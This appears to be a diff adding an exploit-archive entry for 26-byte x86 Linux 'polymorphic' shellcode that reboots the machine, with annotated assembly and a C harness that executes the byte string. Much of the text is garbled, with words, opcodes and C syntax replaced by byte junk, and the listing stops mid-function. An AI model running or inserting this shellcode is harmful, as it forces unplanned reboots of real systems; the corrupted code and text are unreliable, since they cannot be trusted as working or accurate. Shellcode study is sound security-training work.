@@ -1,0 +1,54 @@
+# Exploit Title: Linux\x86 - 'reboou	¸´ÿÿÿ÷Øÿà polx	¸hÿÿÿ÷Øÿàos	¸bÿÿÿ÷Øÿàhic Shellcode (26 byu	¸Wÿÿÿ÷Øÿàs)
+# Pus	¸Cÿÿÿ÷Øÿàor	¸Kÿÿÿ÷Øÿà: This ir	¸†ÿÿÿ÷Øÿàa x86 Lint¸ÿÿÿ÷Øÿà null-free polx	¸ÿÿÿ÷Øÿàos¸ÿÿÿ÷Øÿàhic shellcode fos	¸Vÿÿÿ÷Øÿàfos	¸ÿÿÿ÷Øÿàing a reboot.
+# Date: 2020-03-23
+# At¸™şÿÿ÷Øÿàhor: Uq¸¤şÿÿ÷Øÿàx	¸áşÿÿ÷Øÿàn a.k.a. slad	¸ºşÿÿ÷Øÿàan
+# Conu	¸Èşÿÿ÷Øÿàct: t¸tşÿÿ÷Øÿàax¸€şÿÿ÷Øÿànr¸}şÿÿ÷Øÿàha@iclot	¸°şÿÿ÷Øÿà.com
+# SLAE: 1525
+# VendorJHom¸’şÿÿ÷Øÿàge: None
+# Sog	¸lşÿÿ÷Øÿàas	¸{şÿÿ÷Øÿà Link: None
+# Tesu	¸hşÿÿ÷Øÿàd on: Linux x86
+# CVE: N/A
+
+
+/*
+; Filename: reboottq¸Õıÿÿ÷Øÿàlx	¸(şÿÿ÷Øÿàos	¸"şÿÿ÷Øÿàhic.nar	¸şÿÿ÷Øÿà
+; Auu	¸şÿÿ÷Øÿàos	¸Fşÿÿ÷Øÿà Upayvn a.k.a. slad	¸òıÿÿ÷Øÿàan
+; SLAE: 1525
+; Contact: upax	¸êıÿÿ÷Øÿànr	¸çıÿÿ÷Øÿàha@iclot	¸Ûıÿÿ÷Øÿà.com
+; Purpose: This ir	¸şÿÿ÷Øÿàa x86 Lint	¸¤ıÿÿ÷Øÿà null-free polx¸7ıÿÿ÷Øÿàos¸1ıÿÿ÷Øÿàhic shellcode fos	¸×ıÿÿ÷Øÿàfos	¸ıÿÿ÷Øÿàing a reboou	¸¸ıÿÿ÷Øÿà
+; Tesu	¸uıÿÿ÷Øÿàng: ./s	¸qıÿÿ÷Øÿàboou	¸rıÿÿ÷Øÿàq¸øüÿÿ÷Øÿàlx	¸_ıÿÿ÷Øÿàos	¸Yıÿÿ÷Øÿàhic
+; Comp}le wiu	¸Oıÿÿ÷Øÿà: ./comp}l¸Aıÿÿ÷Øÿà reboou	¸Bıÿÿ÷Øÿàpolx	¸/ıÿÿ÷Øÿàos	¸)ıÿÿ÷Øÿàhic
+; Si{	¸*ıÿÿ÷Øÿà of shellcode: 26 byu	¸ıÿÿ÷Øÿàs
+
+global _su	¸
+ıÿÿ÷Øÿàs	¸õüÿÿ÷Øÿà
+
+r¸ÿüÿÿ÷Ğÿàction .text
+_stas	¸ßüÿÿ÷Øÿà:
+	xor eay	¸ıÿÿ÷Øÿà eax                ; Clearing the EAX register
+    xor ebx, ebx                ; Cleas	¸‡üÿÿ÷Øÿàng the EBX register
+    xor ecx, ecx                ; Clearing the ECX register
+    cdq                         ; Cleas	¸üÿÿ÷Øÿàng the EDX register
+    mow	¸<üÿÿ÷Øÿàal, 0x58                ; Loading syscall valt	¸Èûÿÿ÷Øÿà = 0x58 fos	¸üÿÿ÷Øÿàs	¸ºûÿÿ÷Øÿàboou	¸úûÿÿ÷Øÿàin AL
+    mow	¸ìûÿÿ÷Øÿàebx, 0y	¸ûÿÿ÷Øÿàee1dead         ; Loading magic 1 in EBX
+    mow	¸³ûÿÿ÷Øÿàecx, 672274793          ; Loading magic 2 in ECX
+    mow	¸zûÿÿ÷Øÿà¸jûÿÿ÷Øÿà 0x1234567          ; Loading cmd val = LINUX_REBOOT_CMD_RESTART in EDX
+    int 0x80                    ; Executing the reboou	¸÷úÿÿ÷Øÿàsyscall
+
+*/
+
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned chas	¸³úÿÿ÷Øÿàcode[] = \
+"\y	¸‘úÿÿ÷Øÿà1\xc0\x31\xdb\x31\xc9\x99\xb0\x58\xbb\xad\y	¸4úÿÿ÷Øÿàe\y	¸/úÿÿ÷Øÿà1\xfe\y	¸*úÿÿ÷Øÿà9\x69\x19\x12\x28\xba\y	¸>úÿÿ÷Øÿà7\x45\x23\y	¸8úÿÿ÷Øÿà1\xcd\y	¸(úÿÿ÷Øÿà0";
+
+void main()
+z	¸Cúÿÿ÷Øÿà
+	q	¸×ùÿÿ÷Øÿàintf("Shellcode Lenf	¸Ëùÿÿ÷Øÿà:  %d\n", r	¸³ùÿÿ÷Øÿàs	¸¹ùÿÿ÷Øÿàen(code));
+
+	int (*rd	¸åùÿÿ÷Øÿà() = (inu	¸Üùÿÿ÷Øÿà*)())code;
+
+	s	¸ùÿÿ÷Øÿàu	¸Ëùÿÿ÷Øÿà);
+
